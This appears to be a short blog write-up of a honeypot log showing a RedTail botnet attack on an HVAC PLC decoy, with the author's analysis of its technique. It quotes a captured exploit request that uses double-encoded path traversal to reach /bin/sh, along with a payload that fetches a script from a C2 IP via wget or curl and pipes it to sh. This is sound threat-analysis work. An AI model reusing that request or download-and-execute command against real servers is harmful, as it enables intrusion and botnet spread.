# RedTail Campaign

I set my ICS/SCADA honeypot (Conpot) up mainly to try and analyze/monitor attacks on industrial systems (this one poses as a PLC for an HVAC system), however the majority of the attempts I've noticed have been opportunistic web-based attacks targeting the associated page on port 80.

Recently, I've noticed some similar looking attacks coming from the same IP range in China, both trying to connect to a C2 server in Estonia. I was suspicious because of the similiarity in technique, as well as them both being from China and attempting to communicate with a C2 in Europe... My first thought is inevitably Russians...

So after a quick check, I noticed the user-agent strings from both IPs were also the exact same: `libredtail-http`. This user agent is associated with a known threat actor group: RedTail, whose documented C2 server is the same one I noticed: `178[.]16[.]55[.]224`.

Here is an example of one of the logs I captured:

```bash
2026-02-01 05:50:39,903 HTTP/1.1 POST request from ('101.36.123.102', 46080): 
Path: '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
Headers: [
    ('Host', '134.209.179.94:80'), 
    ('User-Agent', 'libredtail-http'), 
    ('Content-Type', 'text/plain'), 
    ('Content-Length', '119')
]
Payload: (wget --no-check-certificate -qO- https://178.16.55.224/sh || curl -sk https://178.16.55.224/sh) | sh -s apache.selfrep
```

A couple of things stood out to me, other than the clear user-agent giving it away.

The use of `%%32$65` is an immediate red flag, as this is a double-encoded representation of the dot - `.`, used to bypass security filters in order to attempt directory traversal.

The attacker is also using the || (OR) to ensure that if `wget` is not present on the target system, the command falls back to using `curl` instead to fetch the malicious script from the C2 server in Estonia.

You can also see that at the end, the command indicates that the script is intended to immediately begin scanning for other vulnerable Apache servers to continue infecting. This is the telltale sign of an attempt to add a vulnerable server to a botnet.
